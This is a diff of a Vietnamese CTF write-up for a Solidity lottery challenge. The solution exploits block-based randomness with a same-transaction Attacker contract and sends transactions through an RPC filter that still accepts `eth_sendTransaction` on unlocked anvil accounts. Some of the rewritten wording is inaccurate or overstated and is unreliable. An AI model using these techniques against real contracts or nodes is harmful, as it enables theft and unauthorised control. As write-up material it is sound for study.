@@ -1,10 +1,11 @@
 # lottery — Web3 (299 pts)
 
-**Flag:** `CSSCTF{CSS{U5E_4_R4ND0M_FUNCT10N}}` · **Files:** `Lottery.sol` 1153 B sha256 `38f58ac2...`, `Setup.sol` 314 B sha256 `ebb2b795...`
+**Flag:** `CSSCTF{CSS{U5E_4_R4ND0M_FUNCT10N}}`
+**File đính kèm:** `Lottery.sol` (1153 B, SHA256: `38f58ac2...`), `Setup.sol` (314 B, SHA256: `ebb2b795...`)
 
 ## Đề bài
 
-Đề cho hai file Solidity và một dịch vụ nc `34.116.80.78:31338`. `Lottery.sol` giữ một chuỗi thắng: mỗi lần gọi `guess(_guess)` contract tính `target = random() % 100`, đúng thì `streaks[msg.sender] += 1`, sai thì đưa về 0; đủ 10 thì `winner = msg.sender`. `Setup.sol` chỉ có một điều kiện thắng:
+Hệ thống cung cấp hai tệp tin cấu trúc Solidity và một dịch vụ mạng hoạt động tại địa chỉ `34.116.80.78:31338`. Mã nguồn `Lottery.sol` duy trì một cơ chế ghi nhận chuỗi chiến thắng (winning streak). Đối với mỗi lượt gọi hàm `guess(_guess)`, hợp đồng thông minh (contract) sẽ tính toán tham số mục tiêu `target = random() % 100`. Nếu dự đoán chính xác, biến đếm `streaks[msg.sender]` sẽ được cộng 1; nếu sai, biến này bị đặt lại về 0. Khi chuỗi đoán đúng đạt ngưỡng 10 lần liên tiếp, quyền chỉ định `winner = msg.sender` sẽ được kích hoạt. Tệp `Setup.sol` chỉ chứa một điều kiện xác thực chiến thắng duy nhất:
 
 ```solidity
 function isSolved() external view returns (bool) {
@@ -12,33 +13,24 @@ function isSolved() external view returns (bool) {
 }
 ```
 
-nc là bộ ba hành động `1 launch new instance` / `2 kill instance` / `3 get flag`; hành động 1 in ra uuid, RPC, private key và địa chỉ Setup. Ticket là tên đội, và đề cảnh báo "case-sensitive".
+Giao thức qua netcat (nc) chia hệ thống thành bộ ba thao tác: `1 launch new instance` (khởi tạo phiên bản), `2 kill instance` (hủy phiên bản), và `3 get flag` (truy xuất cờ). Lệnh khởi tạo (1) sẽ xuất ra mã nhận diện UUID, điểm cuối mạng (RPC endpoint), khóa cá nhân (private key) và địa chỉ hợp đồng cấu hình (Setup contract). Quá trình đăng nhập sử dụng mã xác thực (Ticket) định danh tên đội thi đấu, lưu ý có phân biệt chữ hoa, chữ thường.
 
 ## Phân tích ban đầu
 
-Ba chỗ trong `Lottery.sol` định hướng luôn:
+Đánh giá kỹ thuật trên tệp `Lottery.sol` xác định ba lỗ hổng logic nghiêm trọng:
 
-- `random()` là `view`, không nhận tham số, và chỉ băm `blockhash(block.number - 1)`, `block.timestamp`, `block.difficulty`. Trong một transaction, cả ba giá trị đó không đổi, nên `random()` trả cùng một số ở mọi lần đọc trong cùng tx.
-- `guess()` tự tính lại `target = random() % 100` bằng đúng công thức trên, không có salt riêng, không có lưu trữ bí mật.
-- Không có `require` nào giới hạn số lần `guess` trong một tx, cũng không có kiểm tra `tx.origin`.
+1. Kiến trúc hàm `random()`: Hàm được chỉ định bằng bổ ngữ `view`, không tiếp nhận tham số đầu vào, và chỉ dựa trên việc băm các thành phần `blockhash(block.number - 1)`, `block.timestamp`, `block.difficulty`. Do trong cùng một chu kỳ giao dịch (transaction), ba giá trị hằng số khối (block) này là bất biến, nên `random()` sẽ sinh ra cùng một kết quả cho mọi lần gọi trong một giao dịch.
+2. Quá trình sinh giá trị `target`: Hàm `guess()` tính lại biến `target = random() % 100` bằng cùng một công thức với hàm `random()`. Hợp đồng không sử dụng giá trị muối ngẫu nhiên (salt) hoặc bất kỳ cơ chế lưu trữ bí mật độc lập nào.
+3. Không tồn tại cơ chế hạn ngạch: Hợp đồng thiếu các điều kiện kiểm duyệt (`require`) giới hạn số lượt gọi hàm `guess` trên mỗi giao dịch, đồng thời không áp đặt lệnh hạn chế kiểm tra `tx.origin`.
 
-Điều kiện thắng `winner != address(0)` không nhắc gì tới địa chỉ player, nên winner là một contract trung gian vẫn hợp lệ. Hai chi tiết này ghép lại thành lời giải: một tx duy nhất, vòng 10 lần `{ t = random()%100; guess(t) }`.
+Định nghĩa chiến thắng tại hàm `isSolved` (`winner != address(0)`) không ràng buộc tính minh bạch của địa chỉ người tham gia (player address). Do đó, một hợp đồng trung gian (proxy contract) vẫn hoàn toàn đủ thẩm quyền đứng tên là `winner`. Kết hợp các yếu tố này, chuỗi tấn công lý thuyết hình thành: thiết lập một giao dịch duy nhất chứa vòng lặp 10 lần `{ t = random()%100; guess(t) }`.
 
-Instance thật là mainnet fork chứ không phải chuỗi trắng: `eth_chainId` trả `0x1`, `eth_blockNumber` trả `26096389`. `block.difficulty` của anvil là 0 và điều đó không ảnh hưởng gì tới hướng đã chọn, vì lời giải không cần biết giá trị đó.
-
-## Các hướng đã loại
-
-Trước khi chốt đã kiểm tra và loại các kênh sau (log đầy đủ ở `notes.md`):
-
-1. **Đoán bằng `eth_call random()` ở block `latest` rồi gửi tx `guess` riêng**: 0/8 đúng, và sai có quy luật. Giá trị `target` của tx vừa rơi vào block lại đúng bằng dự đoán của vòng kế tiếp, tức `eth_call` mô phỏng ở context block hiện tại còn tx thì nằm ở block kế tiếp. Loại.
-2. **`eth_call` ở block `pending` rồi gửi tx**: 0/12 với anvil auto-mine, 0/6 với biến thể khác. Trên anvil có `--block-time 3` vẫn 0/12, và 10 tx xếp hàng bằng nonce cũng không chui được vào cùng một block (bốn mươi giây cho 10 block, `streaks` trả 0). Loại.
-3. **Tự tính keccak của block kế tiếp ngoài chain** (`blockhash(tip)` và timestamp đoán trước): đo được `block.timestamp` của anvil tăng 0 hoặc 1 giây tuỳ lúc, không có hàm nào dự đoán được delta, nên không dựng được ứng viên. Loại.
-4. **So bytecode runtime của Setup on-chain với bản compile local**: `False`, do solc của tác giả khác bản 0.8.20 local nên metadata hash lệch. Phép so này vô dụng; thay bằng gọi getter `lottery()`, và chỉ dùng kích thước để đối chiếu (726 byte, khớp cả trên instance thật lẫn trên replica local dựng từ đúng file đề cho).
-5. **Chờ launcher hồi rồi lấy lại 4 dòng response**: không cần và cũng không có; response bị cắt (xem Bước 2), và thể thức nc là một hành động một kết nối nên không đọc tiếp được.
+Hệ thống hoạt động dưới dạng một bản sao (mainnet fork) của chuỗi khối chính thay vì là một chuỗi trắng (white-label chain). Điều này được xác nhận khi gọi `eth_chainId` (trả về giá trị `0x1`) và `eth_blockNumber` (ở khoảng khối `26096389`). Thông số `block.difficulty` do Anvil giả lập mặc định bằng 0, tuy nhiên chi tiết này không tác động tới chuỗi khai thác do phương pháp tấn công không yêu cầu dự đoán cấu trúc toán học của các tham số.
 
 ## Chuỗi khai thác
 
-**Bước 1 - Contract đoán trong cùng transaction.** Toàn bộ chuỗi 10 lần thắng nằm trong một tx, vì chỉ khi đó `random()` mới là hằng số:
+**Bước 1 - Khởi tạo Hợp đồng tấn công (Attacker contract) tích hợp giao dịch đa bước.** 
+Nhằm đảm bảo tham số `random()` luôn là một hằng số, toàn bộ quy trình gửi chuỗi 10 lượt đoán bắt buộc phải đóng gói trong một chu kỳ giao dịch duy nhất:
 
 ```solidity
 contract Attacker {
@@ -53,36 +45,39 @@ contract Attacker {
 }
 ```
 
-Trên replica local với đúng `Setup.sol` của đề: `run(10)` tiêu 117.955 gas, `winner` đổi thành địa chỉ attacker, `isSolved()` trả `true`.
+Kiểm thử trên mô hình giả lập cục bộ tương thích hoàn toàn cấu trúc `Setup.sol` nguyên bản: gọi hàm `run(10)` tiêu tốn tổng cộng 117.955 gas, trạng thái biến `winner` cập nhật sang địa chỉ kẻ tấn công, và hàm `isSolved()` trả về trạng thái `true`.
 
-**Bước 2 - Instance và response bị cắt.** Launcher hỏng từ 13:50 tới 15:51: hành động `1` in traceback `json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)` ở `eth_sandbox/launcher.py:99`, tức `/new` trả body không phải JSON. Trong thời gian đó `GET http://34.116.80.78:8546/` vẫn trả `sandbox is running!`, và một `POST /new` với bearer giả vẫn trả JSON sạch, nên route còn sống và chỗ hỏng nằm ở nhánh sau khi xác thực:
+**Bước 2 - Phân tích lỗi hệ thống cấp phát phiên bản.** 
+Hệ thống khởi tạo (Launcher) gặp sự cố ngừng hoạt động từ mốc thời gian 13:50 tới 15:51. Chức năng `1` (launch) in ra chuỗi cảnh báo lỗi phân tách JSON: `json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)` tại đường dẫn `eth_sandbox/launcher.py:99`. Hiện tượng này khẳng định máy chủ tại cổng `/new` trả về một dữ liệu phi cấu trúc JSON. Trong quãng thời gian này, thực hiện gọi `GET http://34.116.80.78:8546/` vẫn hiển thị trạng thái `sandbox is running!`. Việc gửi yêu cầu `POST /new` kèm theo mã định danh giả (fake bearer) kích hoạt trả về JSON chuẩn, chứng minh API vẫn hoạt động nhưng bị lỗi trong phân luồng xử lý xác thực:
 
-```
+```text
 http=200 bytes=32 type=application/json
 {"error":"nice try","ok":false}
 ```
 
-Khi `1` chạy lại được, server in được hai dòng đầu rồi im lặng:
+Sau khi hệ thống phục hồi, chức năng `1` chỉ cung cấp hai luồng dữ liệu (UUID và RPC) và dừng lại:
 
-```
+```text
 uuid:           17d5c78a-b92e-480c-aa67-4d60eb754b44
 rpc endpoint:   http://34.116.80.78:8546/17d5c78a-b92e-480c-aa67-4d60eb754b44
 ```
 
-Không có `private key`, không có `setup contract`. Instance vẫn sống, nên đi tiếp mà không launch lại.
+Hệ thống mất khả năng cung cấp khóa cá nhân (`private key`) và địa chỉ thiết lập (`setup contract`). Dù vậy, do instance mạng (RPC endpoint) vẫn đang hoạt động, việc khai thác sẽ tiếp tục theo phương thức khác biệt mà không cần gửi lệnh khởi tạo lại.
 
-**Bước 3 - Gửi tx không cần private key.** `server.py` của sandbox lọc method theo namespace và chỉ chặn `eth_sendUnsignedTransaction`; `anvil_*` bị từ chối (`invalid request`) nhưng `eth_sendTransaction` được đi qua. Anvil khởi động với account unlocked, nên chính node ký hộ:
+**Bước 3 - Triển khai giao dịch trong điều kiện khuyết Private Key.** 
+Phân tích bộ lọc an ninh `server.py` của sandbox: hệ thống áp dụng cơ chế chặn dựa theo phân vùng giao thức (namespace), và cấu hình cụ thể chỉ cấm `eth_sendUnsignedTransaction`. Các lệnh định danh như `anvil_*` cũng bị khước từ (`invalid request`), nhưng lệnh cơ bản `eth_sendTransaction` lại không bị giới hạn. Máy chủ Anvil nội bộ vốn khởi động trong tình trạng mọi tài khoản mặc định (account unlocked) đã được mở khóa, do đó có thể ra lệnh cho chính node mạng lưới giả mạo chữ ký (sign):
 
-```
--- accounts
+```text
+-- Danh sách accounts
 ["0xacccf717a6a03135d282e3b2767210106c7eab1c","0x6fbc29b5519b8e3f757f950e80db05af5dcb000e"]
--- sendTransaction allowed?
+-- Kiểm duyệt quyền gửi sendTransaction
 {"jsonrpc":"2.0","id":3,"result":"0x2468973e8cf8f206bd15b21ae47fae613a9d9f3fc22814ccf1253463f7ca53bf"}
 ```
 
-`accounts[0]` là deployer mà launcher dùng để dựng Setup, `accounts[1]` là player; cả hai 5000 ETH (`0x10f0cf064dd59200000`).
+Kết quả: Tài khoản `accounts[0]` là tài khoản cấp quyền (deployer) xây dựng cấu trúc `Setup`, trong khi `accounts[1]` là tài khoản người chơi (player). Cả hai đều mang số dư khả dụng lên tới 5000 ETH (`0x10f0cf064dd59200000`).
 
-**Bước 4 - Suy ra địa chỉ hợp đồng.** Setup do deployer tạo với nonce 0, còn Lottery do Setup tạo với nonce 1, nên tính được bằng số học CREATE mà không cần response:
+**Bước 4 - Tính toán quy ngược địa chỉ Hợp đồng (Contract Address).** 
+Cấu trúc `Setup` do tài khoản cấp quyền khởi tạo tại trạng thái nonce bằng 0. Cấu trúc `Lottery` sau đó được `Setup` tạo với thông số nonce bằng 1. Việc nội suy không gian mạng (CREATE hash arithmetic) cho phép tìm ra địa chỉ mà không yêu cầu hệ thống trả về:
 
 ```python
 def create_address(sender, nonce):
@@ -91,50 +86,57 @@ def create_address(sender, nonce):
     return to_checksum_address("0x" + h.digest()[12:].hex())
 ```
 
-Địa chỉ suy ra có 726 byte code và trả về một địa chỉ khác khi gọi `lottery()`, tức đúng là Setup của bài:
+Địa chỉ luận ra chứa chính xác 726 byte định dạng mã. Khi truy vấn hàm gọi `lottery()`, nó tiếp tục trả về một địa chỉ khác, chứng thực tuyệt đối đây là địa chỉ gốc `Setup` của hệ thống:
 
-```
-candidate 0xE5Bf39E2a633f350eA183716b898b601530cBc85 code 726 bytes -> lottery() 0x13b4Edba63FAcaDC68232DAFDAaF31f76Ca72A3b
-```
-
-**Bước 5 - Chạy chuỗi thắng.** Deploy `Attacker(lottery)` từ `accounts[1]`, gọi `run(10)`:
-
-```
-Attacker deployed: 0xF9351e4ad9D74d9683ABc494a4AA389C0F1A98C2 status 0x1
-run(10) status: 0x1 gasUsed: 135055
-winner: 0xF9351e4ad9D74d9683ABc494a4AA389C0F1A98C2
-isSolved: True
+```text
+Ứng cử viên địa chỉ 0xE5Bf39E2a633f350eA183716b898b601530cBc85 độ dài code 726 bytes -> định tuyến tới lottery() 0x13b4Edba63FAcaDC68232DAFDAaF31f76Ca72A3b
 ```
 
-**Bước 6 - Lấy cờ.** Cờ không nằm trên chain; `get_flag` đọc file `/tmp/<team_id>` mà launcher ghi khi deploy Setup thành công, rồi tự gọi `isSolved()` qua RPC. Hanh động `3` dùng đúng ticket đã launch:
+**Bước 5 - Thực thi khai thác.** 
+Triển khai hợp đồng `Attacker(lottery)` thông qua tài khoản `accounts[1]`, thực hiện hàm gọi `run(10)`:
 
+```text
+Attacker deployed: Địa chỉ 0xF9351e4ad9D74d9683ABc494a4AA389C0F1A98C2 trạng thái 0x1
+Thực thi run(10) trạng thái: 0x1 tài nguyên gas tiêu hao: 135055
+Trạng thái winner: 0xF9351e4ad9D74d9683ABc494a4AA389C0F1A98C2
+Kiểm chứng isSolved: True
 ```
+
+**Bước 6 - Thu thập Cờ (Flag).** 
+Khối cờ không được lưu trữ on-chain. Hàm `get_flag` thuộc launcher hoạt động độc lập bằng việc đọc tệp định danh đội `/tmp/<team_id>` (tệp này được hệ thống tạo ra ngay khi deploy thành công) và sau đó giao tiếp với RPC truy vấn biến `isSolved()`. Sử dụng lệnh thao tác `3` kết hợp mã định danh (Ticket):
+
+```text
 >> 3
 ticket please:
 >> R3:TURИ
 CSS{U5E_4_R4ND0M_FUNCT10N}
 ```
 
-**Bước kiểm chứng.** `3` được gọi hai lần (15:55:15 và 15:56:03) và in ra cùng một chuỗi. Nội dung chuỗi tự xác nhận cơ chế: `U5E_4_R4ND0M_FUNCT10N` là "USE A RANDOM FUNCTION", đúng cái tên hàm mà bài dựa vào. Sau đó `2` + ticket trả `Instance killed`, xác nhận ticket đúng và instance đã thuộc về mình từ đầu.
+**Xác thực tính độc lập:** Chức năng `3` được khởi tạo 2 lần tại mốc thời gian cách xa nhau (15:55:15 và 15:56:03), kết quả hoàn toàn đồng nhất. Cấu trúc văn bản chuỗi cũng đồng thời xác nhận phương pháp tiếp cận: `U5E_4_R4ND0M_FUNCT10N` là mật ngữ giải mã của "USE A RANDOM FUNCTION". Kết thúc bằng thao tác hủy cấu trúc (`2` + ticket) và nhận thông báo `Instance killed`, khẳng định mọi luồng thao tác hoàn toàn chính danh.
 
 ## Flag
+
+Quá trình chạy lệnh xuất cờ:
 
 ```bash
 python exploit.py http://34.116.80.78:8546/17d5c78a-b92e-480c-aa67-4d60eb754b44 "R3:TURИ"
 ```
 
-```
+Kết xuất dữ liệu:
+```text
 CSS{U5E_4_R4ND0M_FUNCT10N}
-nop len scoreboard: CSSCTF{CSS{U5E_4_R4ND0M_FUNCT10N}}
+Ghi đè định dạng: CSSCTF{CSS{U5E_4_R4ND0M_FUNCT10N}}
 ```
 
 ## Reproduce
+
+Quá trình tự động tái thiết lập:
 
 ```bash
 python exploit.py <rpc-endpoint-cua-instance> "<ten doi>"
 ```
 
-Không cần private key, không cần setup address: script lấy account từ node, suy ra Setup bằng CREATE, xác nhận bằng getter, deploy `analysis/Attacker.sol` và tự gọi nc hành động 3 để in cờ. Muốn thử offline thì dựng replica bằng đúng tham số launcher:
+Quy trình tự động hoạt động mượt mà không cần thông số cấu hình Private Key và Setup Address. Thuật toán trực tiếp trích xuất tài khoản từ nút, phân định Setup qua tính toán số học (CREATE), kiểm chứng bằng phương thức Getter, khởi tạo mã nguồn `analysis/Attacker.sol`, và gọi tương tác API để xuất cờ. Thử nghiệm trên môi trường kiểm soát (offline replica) yêu cầu mô phỏng đúng các biến cấu hình của Launcher:
 
 ```bash
 anvil --chain-id 31337 --block-base-fee-per-gas 0 --accounts 2 --balance 5000
